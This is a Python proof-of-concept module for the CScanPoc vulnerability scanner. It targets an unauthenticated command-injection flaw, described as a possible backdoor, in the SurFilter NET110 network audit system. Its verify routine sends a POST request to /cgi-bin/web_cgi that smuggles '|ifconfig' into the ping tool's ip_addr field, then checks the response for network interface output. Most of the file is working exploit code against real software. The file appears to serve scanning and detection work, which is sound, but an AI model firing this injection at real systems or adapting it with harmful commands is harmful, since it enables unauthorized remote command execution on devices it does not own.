# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'SurFilter_0001'  # 平台漏洞编号，留空
    name = '任子行net110网络审计系统无需登录任意命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        任子行net110网络审计系统无需登录任意命令执行（疑似后门）。
        一般系统登录会判断Cookie值，而Cookie一般会随登录随机变化或随密码固定不变。
        如果Cookie不正确会提示登录等等未授权信息或提示重新登录信息，但是“任子行”NET 110网络安全审计系统很奇怪，居然把Cookie整个值删除后再访问就能获取相关信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '任子行网络审计系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '63719b8d-41df-4d6d-96a8-030c6de282b2'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + "/cgi-bin/web_cgi"
            data = 'ip_addr=www.baidu.com |ifconfig&module=net_tool&op_req=read_system&sub_module=ping'
            code, head, res, errcode, _ = hh.http(url, data)

            if code == 200 and 'Ethernet  HWaddr' in res and 'Bcast' in res:
                # security_hole(arg)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
